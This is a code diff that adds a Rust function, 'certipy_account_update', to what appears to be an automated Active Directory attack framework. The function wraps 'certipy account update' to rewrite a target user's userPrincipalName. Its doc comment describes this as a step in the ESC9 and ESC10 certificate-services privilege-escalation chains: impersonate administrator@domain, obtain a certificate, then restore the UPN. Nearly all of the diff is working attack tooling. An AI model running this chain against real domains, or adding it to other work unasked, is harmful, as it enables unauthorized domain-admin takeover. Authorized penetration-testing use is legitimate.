@@ -562,6 +562,40 @@ pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
         .await
 }
 
+/// Modify a target account's `userPrincipalName` via `certipy account update`.
+///
+/// This is the missing primitive for ESC9 (set a GenericAll-controlled user's
+/// UPN to `administrator@<domain>`, request a cert, then restore the UPN) and
+/// ESC10 (UPN manipulation that makes the weak implicit cert mapping bind to a
+/// privileged account). It keeps the whole ESC9/ESC10 chain on the privesc
+/// worker — `certipy` is installed there, whereas the bloodyAD UPN-write tool
+/// lives only on the `acl` worker, which lacks `certipy` to finish the chain.
+///
+/// Required args: `username`, `domain`, `password`, `user` (target principal),
+///                `upn` (new value; pass the original to restore), `dc_ip`
+pub async fn certipy_account_update(args: &Value) -> Result<ToolOutput> {
+    let username = required_str(args, "username")?;
+    let domain = required_str(args, "domain")?;
+    let password = required_str(args, "password")?;
+    let user = required_str(args, "user")?;
+    let upn = required_str(args, "upn")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+
+    let user_at_domain = format!("{username}@{domain}");
+
+    CommandBuilder::new("certipy")
+        .arg("account")
+        .arg("update")
+        .flag("-username", user_at_domain)
+        .flag("-password", password)
+        .flag("-user", user)
+        .flag("-upn", upn)
+        .flag("-dc-ip", dc_ip)
+        .timeout_secs(120)
+        .execute()
+        .await
+}
+
 /// Run the full ESC4 exploitation chain: template modification -> cert
 /// request -> authentication.
 ///
